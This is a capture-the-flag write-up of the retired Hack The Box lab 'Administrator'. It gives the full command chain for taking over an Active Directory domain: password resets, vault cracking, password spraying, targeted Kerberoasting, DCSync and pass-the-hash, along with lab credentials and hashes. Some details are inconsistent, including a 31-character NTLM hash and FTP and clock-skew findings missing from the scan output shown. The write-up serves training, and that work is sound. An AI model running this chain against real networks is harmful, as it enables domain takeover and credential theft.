---
title: "Administrator — HackTheBox Writeup"
date: 2026-04-28
author: "Angus Dawson"
tags: ["HTB","Windows","Active Directory","BloodHound","Kerberos","DCSync","Impacket","nxc","hashcat","Kerberoasting","Privilege Escalation"]
categories: ["CTF Writeups"]
difficulty: "Medium"
platform: "Hack The Box"
os: "Windows"
summary: "Mapping an Active Directory domain with BloodHound, then walking the permission chain it exposes from a low-privilege account to domain administrator. Olivia → BloodHound ACL chain (ForceChangePassword) → Benjamin → FTP .psafe3 → hashcat → password spray to Emily → targetedKerberoast on Ethan → DCSync Administrator."
images: ["/images/administrator/administrator.png"]
cover:
  image: "/images/administrator/administrator.png"
  alt: "Administrator HTB image"
  caption: "Administrator - CTF - Hack The Box"
  relative: true
  hidden: false

---

> **Spoiler warning**: This writeup documents my playthrough of the retired Hack The Box machine **Administrator**.

The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.

## Overview
- **Platform:** Hack The Box (retired)
- **Target OS:** Windows Server 2022 — Active Directory Domain Controller
- **Focus:** AD enumeration → BloodHound ACL abuse (ForceChangePassword chain) → FTP loot → Password Safe cracking → DCSync → SYSTEM
- **Difficulty:** Medium

---

## Recon

Initial scan:

```bash
nmap -sV -sC -oN scans/administrator-initial 10.129.x.x
```

**Result highlights (relevant lines)**

53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  ldapssl       Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI (WinRM)

The full Kerberos + LDAP + Global-Catalog set confirms this host is a **Domain Controller**. The TLS certificate on 636/3269 disclosed the domain (`administrator.htb`) and the DC hostname.

![Nmap output showing AD service set on the DC](/images/administrator/nmap.png)

---

## Initial credentials & domain enumeration

The box description provides a starting credential:

```text
olivia : ichliebedich
```

Validate against SMB:

```bash
nxc smb 10.129.x.x -u olivia -p 'ichliebedich'
```

`[+] administrator.htb\olivia:ichliebedich` confirms the creds and that `olivia` is a valid domain user.

![nxc smb confirming Olivia's credentials](/images/administrator/nxc_smb_olivia.png)

Pull the domain user list over LDAP for later targeting:

```bash
nxc ldap 10.129.x.x -u olivia -p 'ichliebedich' --users
```

Notable accounts: `olivia`, `michael`, `benjamin`, `emily`, `ethan`, `alexander`, `emma`, `Administrator`, plus the usual built-ins.

---

## BloodHound collection & ACL chain

Collect with `bloodhound-python` directly against the DC:

```bash
bloodhound-python -d administrator.htb -u olivia -p 'ichliebedich' \
  -ns 10.129.x.x -c All --zip
```

Import the zip into BloodHound CE and mark `olivia` as **Owned**. Running **Shortest Paths from Owned Principals** surfaces a clean ACL chain:

```text
OLIVIA --[GenericAll / ForceChangePassword]--> MICHAEL
MICHAEL --[ForceChangePassword]-->  BENJAMIN
```

The chain is the intended foothold ladder. Abuse `ForceChangePassword` twice to land as **Benjamin**, who has access we don't.

![BloodHound graph: Olivia → Michael → Benjamin](/images/administrator/Bloodhound.png)

---

## ForceChangePassword: Olivia → Michael

`ForceChangePassword` lets the principal reset the target's password without knowing the current one. From Linux this is straightforward over SAMR:

```bash
net rpc password 'michael' 'NewP@ssw0rd!1' -U 'administrator.htb/olivia%ichliebedich' -S 10.129.x.x
```

Validate the new credential immediately:

```bash
nxc smb 10.129.x.x -u michael -p 'NewP@ssw0rd!1'
```

![ForceChangePassword reset of Michael's password](/images/administrator/forcechangepassword_michael.png)

![nxc smb confirming Michael's new credential](/images/administrator/nxc_smb_michael.png)

If you prefer running this from a Windows beachhead with PowerView:

```powershell
$pw = ConvertTo-SecureString 'NewP@ssw0rd!1' -AsPlainText -Force
Set-DomainUserPassword -Identity michael -AccountPassword $pw
```

---

## ForceChangePassword: Michael → Benjamin

Repeat the exact same primitive one hop down the chain, this time as **Michael** against **Benjamin**:

```bash
net rpc password 'benjamin' 'NewP@ssw0rd!2' -U 'administrator.htb/michael%NewP@ssw0rd!1' -S 10.129.x.x
```

```bash
nxc smb 10.129.x.x -u benjamin -p 'NewP@ssw0rd!2'
```

![ForceChangePassword reset of Benjamin's password](/images/administrator/forcechangepassword_benjamin.png)

---

## FTP foothold as Benjamin

Benjamin is permitted on the FTP service (port 21), which is why the chain ends here:

```bash
ftp 10.129.x.x
# Name: benjamin
# Password: NewP@ssw0rd!2
ftp> ls
ftp> binary
ftp> get Backup.psafe3
ftp> bye
```

A single artifact drops out: `Backup.psafe3`, a [Password Safe v3](https://pwsafe.org/) encrypted vault.

---

## Cracking the Password Safe vault

Hashcat speaks Password Safe v3 natively as mode `5200`, so there's no need for the `pwsafe2john` detour. Point it straight at the vault file:

```bash
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

![hashcat -m 5200 against Backup.psafe3](/images/administrator/hashcat.png)

rockyou cracks it almost immediately. The master passphrase is `tekieromucho`.

![hashcat cracking the vault: tekieromucho](/images/administrator/hashcat_cracked.png)

Open the vault with the cracked passphrase:

```bash
pwsafe Backup.psafe3
```

Three entries inside — **Alexander Smith**, **Emily Rodriguez**, **Emma Johnson**:

![Password Safe vault open showing Alexander, Emily, Emma](/images/administrator/pwsafe_open.png)

The vault gives three plaintext domain passwords (one per entry):

![Plaintext credentials extracted from the vault](/images/administrator/creds.png)

---

## Password spraying the vault contents

The vault hands you three passwords but not which login each one belongs to. Password Safe stores them by display name, and the actual `samAccountName` mapping isn't guaranteed. Instead of guessing, drop the three accounts into `users.txt` and the three passwords into `pass.txt` and let `nxc` spray them as a matrix:

```bash
nxc smb 10.129.x.x -u users.txt -p pass.txt
```

Only one combination authenticates, `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`:

![nxc password spray matching emily to her vault password](/images/administrator/password_spray.png)

Drop straight into a WinRM shell with the matched cred:

```bash
evil-winrm -i 10.129.x.x -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![evil-winrm landing as emily](/images/administrator/evil_winrm_emily.png)

The user flag lives under `C:\Users\Emily\Desktop\user.txt`.

---

## Privilege escalation: Emily → Ethan

Re-running BloodHound with **Emily** marked as Owned exposes the next edge:

```text
EMILY --[GenericWrite]--> ETHAN
```

Ethan is the target worth reaching because he holds **DCSync rights** (`GetChanges` + `GetChangesAll` on the domain object). `GenericWrite` on a user lets us assign an arbitrary `servicePrincipalName`, which immediately makes Ethan Kerberoastable. That's the whole idea behind **targeted Kerberoasting**: the tool writes a throwaway SPN onto the target, requests a TGS, then cleans up.

### Fix the clock first

Kerberos refuses tickets with skew greater than 5 minutes. The nmap output flagged a ~7h offset against the DC, so sync the local clock before doing anything Kerberos-related:

```bash
sudo ntpdate 10.129.x.x
```

![ntpdate stepping the local clock to match the DC](/images/administrator/ntpdate.png)

### targetedKerberoast

```bash
python3 targetedKerberoast.py -d administrator.htb -u emily \
  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

The script writes an SPN onto Ethan, prints the resulting `$krb5tgs$23$...` hash, and removes the SPN — Ethan looks unchanged afterwards.

![targetedKerberoast against ethan via emily's GenericWrite](/images/administrator/kerberoast.png)

### Cracking Ethan's TGS

Save the hash to `ethan.txt` and crack it as Kerberos 5 TGS-REP (`-m 13100`):

```bash
hashcat -a 0 -m 13100 ethan.txt /usr/share/wordlists/rockyou.txt
```

![hashcat cracking Ethan's TGS](/images/administrator/hashcat_ethan.png)

Plaintext: `limpbizkit`.

---

## DCSync as Ethan

Ethan's ACL gives him `GetChanges` + `GetChangesAll` on the domain object. That's game over. Pull the Administrator secret directly off the DC:

```bash
impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.129.x.x
```

The first `RemoteOperations` call falls back from the service-control path (`access_denied`) to the **DRSUAPI** replication method, which is the actual DCSync, and out comes the `Administrator` NTLM:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3ec553c4b9fd20bd016e098d2d2fd2e:::
```

![secretsdump using DRSUAPI to dump the Administrator NTLM](/images/administrator/secretsdump.png)

---

## SYSTEM via pass-the-hash

Re-use evil-winrm with the NTLM hash to land directly as `Administrator`:

```bash
evil-winrm -i 10.129.x.x -u Administrator -H 3ec553c4b9fd20bd016e098d2d2fd2e
```

`root.txt` lives at `C:\Users\Administrator\Desktop\root.txt`.

---

## Takeaways

- **BloodHound is the map.** The `Olivia → Michael → Benjamin` chain is invisible from raw `net user` output — only an ACL graph surfaces it.
- **`ForceChangePassword` is a sleeper privilege.** It looks innocuous in raw ACL output but is a complete account takeover primitive. Audit who can reset whom in your own AD.
- **Backups leak credentials.** A Password Safe file on FTP is the canonical example — backup pipelines need the same scrutiny as production secrets stores.
- **`GenericWrite` on a user = Kerberoasting.** You don't need an existing SPN; you can write one yourself, roast, then clean up. `targetedKerberoast` automates the whole dance.
- **Watch the clock.** A 7-hour offset against the DC silently breaks every Kerberos request — `ntpdate` before you roast.
- **DCSync is the AD endgame.** Any principal with `GetChanges` + `GetChangesAll` on the domain object can replicate `krbtgt` and `Administrator` — treat those rights as Tier-0.
- **Chain, don't tunnel.** Each hop here was small (one ACL edge, one cracked file, one writable attribute). The compromise emerges from chaining them, which is exactly how real AD breaches look.

---

## Resources

- [BloodHound CE — SpecterOps](https://bloodhound.specterops.io/)
- [Impacket](https://github.com/fortra/impacket) — `secretsdump.py`, `psexec.py`
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) — abuse `GenericWrite` to make a user roastable
- [hashcat](https://hashcat.net/hashcat/) — modes `5200` (Password Safe v3) and `13100` (Kerberos 5 TGS-REP)
- [Password Safe](https://pwsafe.org/)
- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
- Hack The Box — retired machines archive
